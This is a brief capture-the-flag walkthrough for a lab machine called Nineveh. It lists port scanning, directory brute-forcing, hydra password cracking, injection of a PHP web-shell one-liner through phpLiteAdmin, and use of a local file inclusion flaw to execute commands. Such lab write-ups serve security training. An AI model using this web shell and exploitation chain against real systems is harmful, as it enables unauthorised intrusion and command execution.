Step 1 (Enumeration)
- nmap shows port 80,443 open.
- add nineveh.htb to /etc/hosts to bypass port 443 security.
- dirbuster shows /db/ on port 443 and gobuster shows /department/ on port 80.
- hydra shows the password for 80 is '1q2w3e4r5t' and port 443 is 'password123'.
- port 443 is running 'phpliteadmin' which is vulnerable to remote php code injection.
- inject php oneliner into sql field '<?php echo system($_REQUEST["here"]); ?>'

Step 2 (Foothold)
- on port 80 /department/ notes directory is vulnearble to LFI.
- navigate to injected php directory and add at the end '&here=ls' for command execution.
